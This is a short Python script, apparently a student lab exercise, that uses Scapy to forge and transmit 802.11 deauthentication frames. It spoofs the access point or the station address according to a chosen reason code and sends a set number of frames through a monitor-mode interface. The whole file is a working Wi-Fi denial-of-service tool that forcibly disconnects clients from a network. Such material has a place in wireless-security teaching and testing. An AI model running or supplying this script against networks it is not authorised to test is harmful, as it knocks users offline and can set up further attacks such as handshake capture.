# Adrien Barth, Lionel Burgbacher
# 02.03.2020
# Src: https://www.shellvoide.com/python/forge-and-transmit-de-authentication-packets-over-the-air-in-scapy/

import argparse
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

#1 - Unspecified
#4 - Disassociated due to inactivity
#5 - Disassociated because AP is unable to handle all currently associated stations
#8 - Deauthenticated because sending STA is leaving BSS
parser = argparse.ArgumentParser(description='802.11 deauth script')

parser.add_argument("-r", "--reason", required=True, type=int, help="The 802.11 deauthentification reason code.")
parser.add_argument("-b", "--BSSID", required=True, help="BSSID")
parser.add_argument("-s", "--STA", required=True, help="STA")
parser.add_argument("-c", "--count", type=int, default=1, help="Number of packets to send")
args = parser.parse_args()

if(args.reason == 8):
	dst = args.BSSID
	src = args.STA
else:
	dst = args.STA
	src = args.BSSID

frame = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=src) / Dot11Deauth(reason=args.reason)
for _ in itertools.repeat(1, args.count):
	sendp(frame, iface="wlan0mon", verbose=False)
